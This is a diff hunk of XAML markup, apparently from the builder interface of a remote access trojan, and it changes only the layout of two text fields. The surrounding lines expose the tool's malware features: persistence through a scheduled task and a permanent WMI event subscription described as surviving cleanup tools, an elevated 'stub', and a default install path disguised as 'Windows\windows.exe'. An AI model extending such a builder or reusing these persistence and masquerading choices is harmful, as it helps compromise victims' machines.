@@ -2600,14 +2600,14 @@
                                         <CheckBox x:Name="BldPersistTask"     Content="Scheduled Task (admin)"  Style="{StaticResource SChk}" IsChecked="True" Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" ToolTip="Requires admin rights — stub must run elevated" />
                                         <CheckBox x:Name="BldPersistWmi"      Content="WMI Subscription (admin)" Style="{StaticResource SChk}" Checked="BldPersist_Changed" Unchecked="BldPersist_Changed" ToolTip="Installs a permanent WMI __EventFilter + CommandLineEventConsumer in root\subscription. Fires every 60 s after system uptime exceeds 200 s. Requires admin — survives registry/task cleanup tools." />
                                         <StackPanel x:Name="BldInstallPanel">
-                                            <StackPanel Orientation="Horizontal" Margin="0,4,0,4">
-                                                <TextBlock x:Name="BldLblInstallFolder" Text="Install folder: " Foreground="{DynamicResource LabelBrush}" FontSize="12" VerticalAlignment="Center" Width="90" />
-                                                <TextBox x:Name="BldInstallFolder" Style="{StaticResource STxt}" Width="160" Text="Windows" />
-                                            </StackPanel>
-                                            <StackPanel Orientation="Horizontal" Margin="0,0,0,4">
-                                                <TextBlock x:Name="BldLblInstallFile" Text="File name:      " Foreground="{DynamicResource LabelBrush}" FontSize="12" VerticalAlignment="Center" Width="90" />
-                                                <TextBox x:Name="BldInstallFileName" Style="{StaticResource STxt}" Width="160" Text="windows.exe" />
-                                            </StackPanel>
+                                            <DockPanel Margin="0,4,0,4">
+                                                <TextBlock x:Name="BldLblInstallFolder" DockPanel.Dock="Left" Text="Install folder: " Foreground="{DynamicResource LabelBrush}" FontSize="12" VerticalAlignment="Center" MinWidth="90" Margin="0,0,5,0" />
+                                                <TextBox x:Name="BldInstallFolder" Style="{StaticResource STxt}" Text="Windows" />
+                                            </DockPanel>
+                                            <DockPanel Margin="0,0,0,4">
+                                                <TextBlock x:Name="BldLblInstallFile" DockPanel.Dock="Left" Text="File name:      " Foreground="{DynamicResource LabelBrush}" FontSize="12" VerticalAlignment="Center" MinWidth="90" Margin="0,0,5,0" />
+                                                <TextBox x:Name="BldInstallFileName" Style="{StaticResource STxt}" Text="windows.exe" />
+                                            </DockPanel>
                                         </StackPanel>
                                         <TextBox x:Name="BldAuthKey"  Visibility="Collapsed" />
                                         <TextBox x:Name="BldCertHash" Visibility="Collapsed" />
